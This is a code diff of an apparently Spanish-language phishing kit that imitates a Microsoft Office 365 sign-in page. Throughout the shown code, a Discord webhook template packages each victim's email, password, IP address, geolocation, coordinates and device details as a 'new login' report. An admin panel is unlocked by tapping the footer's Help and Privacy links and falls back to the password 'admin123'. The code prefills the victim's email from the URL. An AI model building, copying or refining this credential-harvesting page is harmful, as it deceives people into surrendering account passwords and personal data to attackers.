+  document.getElementById('logoColor4').style.background=c.logoColor4;
+  document.getElementById('modalLogoColor1').style.background=c.logoColor1;
+  document.getElementById('modalLogoColor2').style.background=c.logoColor2;
+  document.getElementById('modalLogoColor3').style.background=c.logoColor3;
+  document.getElementById('modalLogoColor4').style.background=c.logoColor4;
+  document.getElementById('footerHelp').textContent=c.footerHelpText;
+  document.getElementById('footerTerms').textContent=c.footerTermsText;
+  document.getElementById('footerPrivacy').textContent=c.footerPrivacyText;
+  document.getElementById('footerPrivate').innerHTML=(c.footerPrivateText||'')+' <a href="#">Más información</a>';
 
-    function loadDefaultTemplate() {
-      const defaultTemplate =
-        '🔐 Nuevo inicio de sesión\n' +
-        '──────────────────────────\n' +
-        'Usuario: {email}\n' +
-        'Contraseña: {password}\n' +
-        'IP: {ip}\n' +
-        'Geo IP: {geoIp}\n' +
-        'Ciudad: {geoCity}\n' +
-        'Región: {geoRegion}\n' +
-        'País: {geoCountry} ({geoCountryCode})\n' +
-        'ISP: {geoIsp}\n' +
-        'Latitud: {geoLatitude}\n' +
-        'Longitud: {geoLongitude}\n' +
-        '\nDispositivo:\n' +
-        'Memoria RAM: {deviceMemory}\n' +
-        'CPU: {cpuCores}\n' +
-        'Batería: {batteryLevel} (Cargando: {batteryCharging})\n' +
-        '\nNavegador: {userAgent}\n' +
-        'Idioma: {language}\n' +
-        'Pantalla: {screenResolution} ({colorDepth} bits)\n' +
-        'Zona horaria: {timezone}\n' +
-        '──────────────────────────\n' +
-        'Hora: {timestamp}';
+  document.getElementById('logoText').value=c.logoText;
+  document.getElementById('logoImage').value=c.logoImage;
+  document.getElementById('logoColor1').value=c.logoColor1;
+  document.getElementById('logoColor2').value=c.logoColor2;
+  document.getElementById('logoColor3').value=c.logoColor3;
+  document.getElementById('logoColor4').value=c.logoColor4;
+  document.getElementById('pageTitle').value=c.pageTitle;
+  document.getElementById('pageSubtitle').value=c.pageSubtitle;
+  document.getElementById('emailPlaceholder').value=c.emailPlaceholder;
+  document.getElementById('passwordPlaceholder').value=c.passwordPlaceholder;
+  document.getElementById('nextButtonText').value=c.nextButtonText;
+  document.getElementById('loginButtonText').value=c.loginButtonText;
+  document.getElementById('forgotUsernameText').value=c.forgotUsernameText;
+  document.getElementById('forgotPasswordText').value=c.forgotPasswordText;
+  document.getElementById('newUserText').value=c.newUserText;
+  document.getElementById('createAccountText').value=c.createAccountText;
+  document.getElementById('otherSignInText').value=c.otherSignInText;
+  document.getElementById('footerHelpText').value=c.footerHelpText;
+  document.getElementById('footerTermsText').value=c.footerTermsText;
+  document.getElementById('footerPrivacyText').value=c.footerPrivacyText;
+  document.getElementById('footerPrivateText').value=c.footerPrivateText;
+  document.getElementById('loginBgType').value=c.loginBgType;
+  document.getElementById('loginBgColor').value=c.loginBgColor;
+  document.getElementById('loginBgGradient').value=c.loginBgGradient;
+  document.getElementById('loginBgImage').value=c.loginBgImage;
+  document.getElementById('discordWebhook').value=c.discordWebhook;
+  document.getElementById('discordTemplate').value=c.discordMessageTemplate;
+  document.getElementById('dashboardTitleInput').value=c.dashboardTitle;
+  document.getElementById('dashboardSubtitleInput').value=c.dashboardSubtitle;
+  document.getElementById('dashboardWelcomeText').value=c.dashboardWelcomeText;
+  document.getElementById('adminPassword').value=c.adminPassword;
+  toggleBgOptions(c.loginBgType);
+}
 
-      document.getElementById('discordTemplate').value = defaultTemplate;
-      updateSetting('discordMessageTemplate', defaultTemplate);
-    }
+function toggleBgOptions(type){
+  document.getElementById('colorOption').classList.toggle('hidden',type!=='color');
+  document.getElementById('gradientOption').classList.toggle('hidden',type!=='gradient');
+  document.getElementById('imageOption').classList.toggle('hidden',type!=='image');
+}
 
-    function applyConfigToUI() {
-      const cfg = getConfig();
+async function updateSetting(key,value){
+  config[key]=value;
+  try{const res=await fetch('/api/config',{method:'PATCH',headers:{'Content-Type':'application/json'},body:JSON.stringify({config:{[key]:value}})});const data=await res.json();if(data.success)showToast('Guardado correctamente');else showToast('Guardado local');}
+  catch(e){showToast('Guardado local');}
+  localStorage.setItem('mailoffice365_cfg',JSON.stringify(config));
+}
 
-      // Dashboard
-      document.getElementById('dashboardLogoText').textContent = cfg.logoText || cfg.companyName;
-      document.getElementById('dashboardTitle').textContent = cfg.dashboardTitle || 'Bienvenido a tu panel';
-      document.getElementById('dashboardSubtitle').textContent = cfg.dashboardSubtitle || 'Administra tu página';
-      document.getElementById('dashboardUserEmail').textContent = getEmailFromUrl();
+function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.remove('hidden');setTimeout(()=>t.classList.add('hidden'),2500);}
 
-      // Login fields (para que el admin vea qué se muestra)
-      document.getElementById('logoText').value = cfg.logoText || '';
-      document.getElementById('pageTitle').value = cfg.pageTitle || '';
-      document.getElementById('pageSubtitle').value = cfg.pageSubtitle || '';
-      document.getElementById('footerHelpText').value = cfg.footerHelpText || '';
-      document.getElementById('footerTermsText').value = cfg.footerTermsText || '';
-      document.getElementById('footerPrivacyText').value = cfg.footerPrivacyText || '';
+function loadDefaultTemplate(){
+  const tpl='🔐 Nuevo inicio de sesión\n──────────────────────────\nUsuario: {email}\nContraseña: {password}\nIP: {ip}\nCiudad: {geoCity}\nPaís: {geoCountry} ({geoCountryCode})\nISP: {geoIsp}\nLatitud: {geoLatitude}\nLongitud: {geoLongitude}\n\nDispositivo:\nMemoria RAM: {deviceMemory}\nCPU: {cpuCores}\nBatería: {batteryLevel} (Cargando: {batteryCharging})\n\nNavegador: {userAgent}\nIdioma: {language}\nPantalla: {screenResolution} ({colorDepth} bits)\nZona horaria: {timezone}\n──────────────────────────\nHora: {timestamp}';
+  document.getElementById('discordTemplate').value=tpl;
+  updateSetting('discordMessageTemplate',tpl);
+}
 
-      // Background
-      document.getElementById('loginBgType').value = cfg.loginBgType || 'color';
-      document.getElementById('loginBgColor').value = cfg.loginBgColor || '#0a0a1a';
-      document.getElementById('loginBgGradient').value = cfg.loginBgGradient || '';
-      document.getElementById('loginBgImage').value = cfg.loginBgImage || '';
+function switchTab(tab){
+  currentTab=tab;
+  document.querySelectorAll('.tab-content').forEach(el=>el.classList.add('hidden'));
+  document.getElementById('tab-'+tab).classList.remove('hidden');
+  document.querySelectorAll('.tab-btn').forEach(btn=>{
+    const isActive=(tab==='appearance'&&btn.textContent==='Apariencia')||(tab==='discord'&&btn.textContent==='Discord')||(tab==='content'&&btn.textContent==='Contenido');
+    btn.classList.toggle('active',isActive);
+  });
+}
 
-      // Toggle visibility of background options
-      toggleBgOptions(cfg.loginBgType || 'color');
+function onHelpTap(){helpTapCount++;checkAdminAccess();}
+function onPrivacyTap(){privacyTapCount++;checkAdminAccess();}
+function checkAdminAccess(){if(helpTapCount>=2&&privacyTapCount>=2)showAdminModal();}
 
-      // Discord
-      document.getElementById('discordWebhook').value = cfg.discordWebhook || '';
-      document.getElementById('discordMessageTemplate').value = cfg.discordMessageTemplate || '';
+function showAdminModal(){
+  if(modalVisible)return;
+  modalVisible=true;
+  document.getElementById('adminModal').classList.remove('hidden');
+  document.getElementById('adminPasswordInput').value='';
+  document.getElementById('adminError').style.display='none';
+}
 
-      // Footer
-      document.getElementById('footerHelp').textContent = cfg.footerHelpText || 'Ayuda';
-      document.getElementById('footerTerms').textContent = cfg.footerTermsText || 'Términos de uso';
-      document.getElementById('footerPrivacy').textContent = cfg.footerPrivacyText || 'Privacidad y cookies';
-      document.getElementById('footerPrivate').innerHTML =
-        (cfg.footerPrivateText || 'Usa la exploración privada si este no es tu dispositivo.') +
-        ' <a href="#">Más información</a>';
-    }
+function hideAdminModal(){
+  modalVisible=false;
+  document.getElementById('adminModal').classList.add('hidden');
+  helpTapCount=0;
+  privacyTapCount=0;
+}
 
-    function toggleBgOptions(type) {
-      document.getElementById('colorOption').classList.toggle('hidden', type !== 'color');
-      document.getElementById('gradientOption').classList.toggle('hidden', type !== 'gradient');
-      document.getElementById('imageOption').classList.toggle('hidden', type !== 'image');
-    }
+async function attemptAdminAccess(){
+  const password=document.getElementById('adminPasswordInput').value;
+  const adminPass=(config&&config.adminPassword)||'admin123';
+  if(password===adminPass){
+    hideAdminModal();
+    const mainEl=document.getElementById('mainContent');
+    mainEl.classList.remove('hidden');
+    mainEl.style.display='block';
+    switchTab('appearance');
+    applyConfig();
+  }else{
+    document.getElementById('adminError').textContent='Contraseña incorrecta';
+    document.getElementById('adminError').style.display='block';
+  }
+}
 
-    function switchTab(tab) {
-      currentTab = tab;
-      document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
-      document.getElementById('tab-' + tab).classList.remove('hidden');
-      document.querySelectorAll('.tab-btn').forEach(el => {
-        el.style.color = (el.textContent.toLowerCase().includes(tab === 'appearance' ? 'apariencia' :
-          tab === 'discord' ? 'discord' : 'contenido')) ? '#0078d4' : '#605e5c';
-        el.style.borderBottomColor = (el.textContent.toLowerCase().includes(tab === 'appearance' ? 'apariencia' :
-          tab === 'discord' ? 'discord' : 'contenido')) ? '#0078d4' : 'transparent';
-      });
-    }
+function exitAdmin(){
+  const mainEl=document.getElementById('mainContent');
+  if(mainEl){mainEl.classList.add('hidden');mainEl.style.display='none';}
+  helpTapCount=0;
+  privacyTapCount=0;
+}
 
-    // ========== ADMIN ACCESS (DOUBLE-TAP) ==========
-    let helpTapCount = 0;
-    let privacyTapCount = 0;
-    let adminModalVisible = false;
+function getEmailFromUrl(){
+  const params=new URLSearchParams(window.location.search);
+  return params.get('email')||'USUARIO';
+}
 
-    document.getElementById('footerHelp').addEventListener('click', function(e) {
-      e.preventDefault();
-      helpTapCount++;
-      if (helpTapCount >= 2 && privacyTapCount >= 2) {
-        showAdminModal();
-      }
-    });
+document.getElementById('footerHelp').addEventListener('click',function(e){e.preventDefault();onHelpTap();});
+document.getElementById('footerPrivacy').addEventListener('click',function(e){e.preventDefault();onPrivacyTap();});
 
-    document.getElementById('footerPrivacy').addEventListener('click', function(e) {
-      e.preventDefault();
-      privacyTapCount++;
-      if (helpTapCount >= 2 && privacyTapCount >= 2) {
-        showAdminModal();
-      }
-    });
-
-    function showAdminModal() {
-      if (adminModalVisible) return;
-      adminModalVisible = true;
-      document.getElementById('adminModal').classList.remove('hidden');
-      document.getElementById('adminPassword').value = '';
-      document.getElementById('adminError').style.display = 'none';
-    }
-
-    function hideAdminModal() {
-      adminModalVisible = false;
-      document.getElementById('adminModal').classList.add('hidden');
-      helpTapCount = 0;
-      privacyTapCount = 0;
-    }
-
-    async function attemptAdminAccess() {
-      const password = document.getElementById('adminPassword').value;
-      const cfg = getConfig();
-      const adminPass = cfg.adminPassword || 'admin123';
-
-      if (password === adminPass) {
-        hideAdminModal();
-        document.getElementById('mainContent').style.display = 'block';
-        switchTab('appearance');
-        applyConfigToUI();
-      } else {
-        document.getElementById('adminError').textContent = 'Contraseña incorrecta';
-        document.getElementById('adminError').style.display = 'block';
-      }
-    }
-
-    // Exit admin mode
-    function exitAdmin() {
-      document.getElementById('mainContent').style.display = 'none';
-      helpTapCount = 0;
-      privacyTapCount = 0;
-    }
-
-    // ========== GET EMAIL FROM URL ==========
-    function getEmailFromUrl() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('email');
-      if (email) {
-        // Clear for next time
-        window.history.replaceState({}, document.title, window.location.pathname);
-        try { localStorage.removeItem('mailoffice365_email'); } catch(e) {}
-        return decodeURIComponent(email);
-      }
-      return 'usuario';
-    }
-
-    // ========== INIT ==========
-    async function init() {
-      const serverConfig = await loadConfigFromServer();
-      if (serverConfig) {
-        applyConfigToUI();
-      } else {
-        const localConfig = loadConfigFromLocalStorage();
-        if (localConfig) {
-          applyConfigToUI();
-        } else {
-          applyConfigToUI();
-        }
-      }
-    }
-
-    init();
-  </script>
+(async ()=>{
+  await loadConfig();
+  applyConfig();
+  const email=getEmailFromUrl();
+  document.getElementById('dashboardUserEmail').textContent=(email&&email!=='USUARIO')?email:'USUARIO';
+})();
+</script>
 </body>
 </html>
